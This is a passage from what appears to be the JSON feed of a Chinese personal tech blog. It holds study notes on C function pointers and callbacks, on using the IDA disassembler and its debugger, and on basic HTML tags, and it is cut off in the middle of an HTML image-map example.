class=\"token punctuation\">(</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">//srand () 用于初始化 rand (),null 其实是默认</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span>        <span class=\"token comment\">// 获取时间是为了保障 rand () 的随机，否则多次调用时可能会重复</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      r<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token keyword\">return</span> r<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">/* 要调用上面定义函数的主函数 */</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>   <span class=\"token comment\">/* 一个指向整数的指针 */</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>   <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>   <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>   p <span class=\"token operator\">=</span> <span class=\"token function\">getRandom</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>   <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>   <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>       <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"*(p + [%d]) : %d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">+</span> i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"函数指针\"><a class=\"anchor\" href=\"#函数指针\">#</a> 函数指针：</h4>\n<p>定义</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>fun_ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 声明一个指向同样参数、返回值的函数指针类型</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>fun_ptr a<span class=\"token operator\">=</span>max<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 声明这个类型，只是为了在这句定义里检查类型是否符合，其实就是类型检查，还有就是方便修改，不用一个一个改类型，同时方便创建</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><h4 id=\"回调函数\"><a class=\"anchor\" href=\"#回调函数\">#</a> 回调函数：</h4>\n<p><strong>函数指针作为某个函数的参数</strong></p>\n<p>可以根据不同的条件调用不同的函数，比较灵活</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span>  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">populate_array</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>array<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> arraySize<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>getNextValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span>arraySize<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">getNextValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">// 获取随机值</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">getNextRandomValue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">int</span> myarray<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\">/* getNextRandomValue 不能加括号，否则无法编译，因为加上括号之后相当于传入此参数时传入了 int （函数的返回值）, 而不是函数指针 */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">populate_array</span><span class=\"token punctuation\">(</span>myarray<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> getNextRandomValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> myarray<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/14/IDA%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/14/IDA%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "title": "IDA",
            "date_published": "2024-10-14T05:21:05.000Z",
            "content_html": "<h1 id=\"ida\"><a class=\"anchor\" href=\"#ida\">#</a> IDA</h1>\n<p>ida 插件环境：</p>\n<p>1. 至少 Python3.8</p>\n<p>2. 多个使用 IDA 目录下的 idaplyswitch.exe</p>\n<p>插件：</p>\n<p>直接把 xxx.py 放到目录的 plugins 目录</p>\n<p>KeyPatch (修改汇编)</p>\n<blockquote>\n<p>依赖安装：pip install keystone-engine</p>\n</blockquote>\n<p>LazyIDA (提取，批量修改)</p>\n<p><em>至于用 64 还是 32，可以用查壳软件直接看</em></p>\n<p><em>在 linux 下也可以使用 file 命令</em></p>\n<p><em>但是实际上可以试错，不是直接打不开然后提醒，就是反汇编时会提醒</em></p>\n<h2 id=\"function-窗口\"><a class=\"anchor\" href=\"#function-窗口\">#</a> function 窗口</h2>\n<p><strong>按 G 可以地址导航，按 TAB 显示伪代码</strong></p>\n<p><strong>在该窗口中使用 Ctrl+F 就可以用关键字查找</strong></p>\n<p>这里包含了分析出的所有函数</p>\n<p>IDAview</p>\n<p>图形窗口</p>\n<p>会显示控制流，按空格切换为文本模式，这是按照线性地址</p>\n<p>分析一般从 main 开始，但是万一 main 函数名字没有识别到</p>\n<p>可以根据输出的内容来定位地址（去字符串窗口找），然后定位函数</p>\n<h2 id=\"字符串窗口\"><a class=\"anchor\" href=\"#字符串窗口\">#</a> 字符串窗口</h2>\n<p><strong>shift+12</strong></p>\n<p><strong>在该窗口中使用 Ctrl+F 也可以用关键字查找（其实所有表格窗口都可以）</strong></p>\n<p>它包括了所有已识别的字符串</p>\n<p><strong>选中按 U 取消已定义的标识符，按 A 重建，按 X 显示所有引用选中的字符串的地方</strong></p>\n<h2 id=\"hex-view\"><a class=\"anchor\" href=\"#hex-view\">#</a> hex view</h2>\n<p>动态调试时显示内存数据，正常是显示静态数据</p>\n<h2 id=\"importsexports\"><a class=\"anchor\" href=\"#importsexports\">#</a> imports/exports</h2>\n<p>导入导出表</p>\n<p>显示引用的 api，使用里面的函数</p>\n<p>分析动态链接库时，同时要看导出的函数</p>\n<p>程序入口会被 ida 当成一个叫做 start 的导出函数</p>\n<p>在运行时 start 先被初始化，然后调用 main 函数</p>\n<h2 id=\"其他玩意儿\"><a class=\"anchor\" href=\"#其他玩意儿\">#</a> 其他玩意儿</h2>\n<h4 id=\"重命名函数\"><a class=\"anchor\" href=\"#重命名函数\">#</a> 重命名函数：</h4>\n<p>ida 反编译的有时名字不太对，为了方便看，所以建议重命名<br />\n（自己要猜一猜可能是什么库函数）</p>\n<p>选中，然后按 N</p>\n<h1 id=\"ida动态调试\"><a class=\"anchor\" href=\"#ida动态调试\">#</a> IDA 动态调试</h1>\n<p>作用：</p>\n<p>验证静态分析结果</p>\n<p>观察程序运行时数据</p>\n<h2 id=\"支持的特性\"><a class=\"anchor\" href=\"#支持的特性\">#</a> 支持的特性：</h2>\n<h3 id=\"1软件硬件条件脚本断点\"><a class=\"anchor\" href=\"#1软件硬件条件脚本断点\">#</a> 1. 软件 / 硬件 / 条件 / 脚本断点</h3>\n<p>设置断点，点前面，或者选中按 F2</p>\n<p>在伪代码设断点，可能会导致有些没执行（断点会在函数传参时）</p>\n<p>软件：IDA 在地址上设置断点（0xCC）, 到达后在恢复</p>\n<p>硬件断点：通过 CPU 抛出错误来断点</p>\n<p>条件断点：到达后执行特定脚本，并返回真表示被命中</p>\n<p>脚本断点：基本和上面一样，但是返回值永远是假</p>\n<h3 id=\"2步入步过步出执行到光标位置\"><a class=\"anchor\" href=\"#2步入步过步出执行到光标位置\">#</a> 2. 步入 / 步过 / 步出 / 执行到光标位置 /</h3>\n<p>步入：进入 call 函数（F7）</p>\n<p>步过：直接到 call 函数的返回地址（F8）</p>\n<p>步出：中断函数回到其调用者（执行到返回）（Ctrl+F7）</p>\n<p>执行到光标位置：直接执行到选中位值（实际上是设置临时断点）(F4)</p>\n<p>设置代码执行位置：用于跳过不想执行的代码（Ctrl+N）</p>\n<p>注意 scanf 会强行暂停等待输入</p>\n<h3 id=\"3汇编级伪代码源码调试代码级支持\"><a class=\"anchor\" href=\"#3汇编级伪代码源码调试代码级支持\">#</a> 3. 汇编级 / 伪代码 / 源码 / 调试代码级支持</h3>\n<p>IDA 会在存在源代码时自动导入，但是不如直接用 VS 之类的集成开发软件</p>\n<h3 id=\"4寄存器内存读写\"><a class=\"anchor\" href=\"#4寄存器内存读写\">#</a> 4. 寄存器 / 内存读写</h3>\n<p>不是很方便，建议装上面插件</p>\n<h3 id=\"5启动进程附加调试\"><a class=\"anchor\" href=\"#5启动进程附加调试\">#</a> 5. 启动进程 / 附加调试</h3>\n<p>启动调试可以每一步调试，也可以调试初始化代码（如果没有反调试）</p>\n<p>附加调试不能调试初始化代码，但是有些程序是子程序，不附加环境不一样</p>\n<p>也用来调试动态库以及绕过一些反调试</p>\n<p>注：附加可以用 Ctrl+F 快速查找要附加到的程序</p>\n<h3 id=\"6内存窗口\"><a class=\"anchor\" href=\"#6内存窗口\">#</a> 6. 内存窗口</h3>\n<p>在窗口中按 G 跳转到特定地址（自己提前复制）</p>\n<p>按 F2 修改内存（无插件时），可以输入十六进制数字，再按 F2 保存修改</p>\n<p>用 LazyIDA 时，进入编辑模式时右键可以选 pastedata，这样可以用 ascll 模式</p>\n<p>但是这玩意儿不会自己不 00，所以还要自己加</p>\n<h3 id=\"7模块窗口\"><a class=\"anchor\" href=\"#7模块窗口\">#</a> 7. 模块窗口</h3>\n<p>显示模块列表</p>\n<p>Debuger--&gt;Debuger Windows--&gt;Modules</p>\n<p>在 Windows 上是 dll,Linux 上是 so</p>\n<h2 id=\"远程调试\"><a class=\"anchor\" href=\"#远程调试\">#</a> 远程调试</h2>\n<p>安装环境：</p>\n<p>在安装目录下的 debugsrv 目录，选择对应系统的 sever，复制到目标环境运行（子系统必须是 wsl2）</p>\n<p>为了方便可以加到 path 里</p>\n<pre><code>echo $PATH\n//调试目录就是执行目录\n</code></pre>\n<p>配置：</p>\n<p>Debuger--&gt;process options</p>\n<p>Host 填 Linux 地址（wsl 会自动填回环地址）</p>\n<p>Port 就填 Linux 上显示的监听端口</p>\n<p>其他不要填</p>\n<p>如果修改的代码，记得删掉重新上传</p>\n",
            "tags": [
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/14/HTML/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/14/HTML/",
            "title": "HTML",
            "date_published": "2024-10-14T05:21:05.000Z",
            "content_html": "<h3 id=\"html\"><a class=\"anchor\" href=\"#html\">#</a> <strong>HTML</strong></h3>\n<h4 id=\"0e\"><a class=\"anchor\" href=\"#0e\">#</a> 0.e...</h4>\n<p><a href=\"//xn--fqru53bs8r.xn--htm-gu5f.html\">// 后缀是.htm 或.html</a></p>\n<p>// 要运行的话浏览器里<a href=\"%E4%BB%A5/%E5%BC%80%E5%A4%B4%E7%9A%84%E7%96%91%E4%BC%BC%E4%BB%8E%E8%AF%A5html%E6%89%80%E5%9C%A8%E8%B7%AF%E5%BE%84%E5%BC%80%E5%A7%8B\">输入路径就行</a></p>\n<p>//&lt;&gt; 中的就是关键词，通常成对出现。（即 &lt; xx&gt; 和 &lt;/xx&gt;）</p>\n<p>// 开始和结束标签（&lt;xx&gt; 与 &lt;/xx&gt;）, 也叫开放标签和闭合标签</p>\n<p>1.html 本身是一种标记语言（ 超文本标记语言， <strong>H</strong>yper <strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage  ），而不是编程语言，是一套编辑标签。（使用其来描述网页）</p>\n<p>2.html 可以使用记事本来写</p>\n<p>也有专业的：</p>\n<ul>\n<li>Adobe Dreamweaver</li>\n<li>Microsoft Expression Web</li>\n<li>CoffeeCup HTML Editor</li>\n</ul>\n<h4 id=\"1标签\"><a class=\"anchor\" href=\"#1标签\">#</a> 1. 标签</h4>\n<h5 id=\"一般\"><a class=\"anchor\" href=\"#一般\">#</a> 一般</h5>\n<p>#还有部分在文本格式化</p>\n<pre><code>&lt;html&gt;：文本描述网页，写在最前和最后\n&lt;body&gt;：可见页面文本,是文档的主体\n&lt;h1/2/3/4/5/6&gt;：标题，会自动空行\n&lt;p&gt;：段落，也会自动空行\n#块级元素都会自动空行#\n&lt;br /&gt;：没有关闭标签的空元素（定义换行），似乎&lt;br /&gt;也可以用来创建列表\n*#连续的空格或者空行（换行），都会变成一个空格，这包括空白字符和回车#\n&lt;hr /&gt;：用于分割内容，创建水平线，单个出现\n</code></pre>\n<p>*：这是为了在拖动浏览器窗口时，还能正常显示。如果想要保留，可以使用 &lt;pre&gt;（预格式文本）标签，这适合显示代码（也有其他专门为显示代码的，见文本格式化）</p>\n<h5 id=\"特殊\"><a class=\"anchor\" href=\"#特殊\">#</a> 特殊</h5>\n<hr />\n<h6 id=\"1锚a\"><a class=\"anchor\" href=\"#1锚a\">#</a> 1. 锚 (a)</h6>\n<pre><code>&lt;p&gt;&lt;a href=&quot;网页链接或者另一个html（需要路径）&quot; style=&quot;text-decoration:none&quot; target=&quot;_blank&quot;&gt;link&lt;/a&gt;&lt;/p&gt;\n</code></pre>\n<p>// 这时 link 是个超链接</p>\n<p>​      style 用于去除默认带的下划线</p>\n<p>​      <a href=\"%E5%85%B6%E5%80%BC%E8%BF%98%E6%9C%89_(%E5%89%8D%E9%9D%A2%E6%98%AF%E4%B8%8B%E5%88%92%E7%BA%BF)top%EF%BC%9A%E7%94%A8%E4%BA%8E%E8%B7%B3%E5%87%BA%E6%A1%86%E6%9E%B6%EF%BC%88%E9%87%8D%E5%BC%80%EF%BC%9F%EF%BC%89%EF%BC%8C%E4%BD%86%E6%B2%A1%E6%9C%89%E6%96%B0%E7%AA%97%E5%8F%A3\">target</a> 表示在新窗口打开</p>\n<p>href 属性还可以链接邮件</p>\n<p>写成  (%20 用于代替空格)</p>\n<pre><code>&lt;a href=&quot;mailto:someone@microsoft.com?subject=Hello%20again&quot;&gt;发送邮件&lt;/a&gt;\n</code></pre>\n<p>&lt;a&gt; 还有 name 属性，用于定义锚。<a href=\"%E8%A2%AB%E8%B0%83%E7%94%A8%E6%97%B6%EF%BC%8C%E8%A6%81%E5%9C%A8%E5%90%8D%E7%A7%B0%E5%89%8D%E5%8A%A0#%EF%BC%8C%E4%BB%8E%E9%9D%9E%E8%AF%A5html%E8%B0%83%E7%94%A8%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%9C%A8url(%E5%88%B0%E8%AF%A5html)%E6%9C%80%E5%90%8E%E5%8A%A0%E4%B8%8A#%E5%92%8C%E5%90%8D%E7%A7%B0\">不会直观体现，但可以被链接</a>，注意被调用时是写 name 的属性，而不是 &lt;a&gt; 的元素</p>\n<h6 id=\"2图像img\"><a class=\"anchor\" href=\"#2图像img\">#</a> 2. 图像 (img)</h6>\n<p>动图一样</p>\n<pre><code>&lt;img src=&quot;图片地址&quot; width=&quot;104&quot; height=&quot;142&quot; border=&quot;0&quot; /&gt;\n</code></pre>\n<p>//&lt;img&gt; 不是闭合标签，并且套在 &lt; p &gt; 时会和该文本对齐（<a href=\"%E4%BD%BF%E7%94%A8align%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9%EF%BC%8C%E5%BA%95%E9%83%A8%EF%BC%9Abottom,%E9%A1%B6%E9%83%A8%EF%BC%9Atop,%E4%B8%AD%E9%83%A8%EF%BC%9Amiddle,left:%E6%B5%AE%E5%8A%A8%E5%88%B0%E5%B7%A6%E4%BE%A7%EF%BC%8C%E5%8F%B3%E5%90%8C%E7%90%86\">默认底部</a>）</p>\n<p>//border 是边框</p>\n<p>//width 和 height 实际上是调整大小，而不是定义</p>\n<p>&lt;del&gt;src 其实是是 scource 的意思 &lt;/del&gt;</p>\n<p><strong>最后的 / 不能省略</strong></p>\n<p>其他属性：</p>\n<p>alt: 替换文本，当不能正常加载图片时显示，很多时候鼠标移上去也会</p>\n<p>其它图像插入：</p>\n<p>&lt;body background=&quot;/i/eg_background.jpg&quot;&gt;</p>\n<p>// 背景图像，写在 body 里，只能.jpg 或.gif，小了会重复</p>\n<h6 id=\"3map与area\"><a class=\"anchor\" href=\"#3map与area\">#</a> 3.map 与 area</h6>\n<p>这个不太好说，自己体会</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>请点击图像上的星球，把它们放大。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/i/eg_planets.jpg<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token attr-name\">border</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>0<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">usemap</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#planetmap<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Planets<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>map</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>planetmap<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>planetmap<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>area</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token attr-name\">shape</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>circle<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token attr-name\">coords</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>180,139,14<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token attr-name\">href</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/example/html/venus.html<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token attr-name\">target</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>_blank<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Venus<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>area</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token attr-name\">shape</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>circle<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token attr-name\">coords</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>129,161,10<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token attr-name\">href</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/example/html/mercur.html<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token attr-name\">target</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>_blank<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Mercury<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>area</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token attr-name\">shape</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>rect<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token attr-name\">coords</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>0,0,110,260<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token attr-name\">href</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token 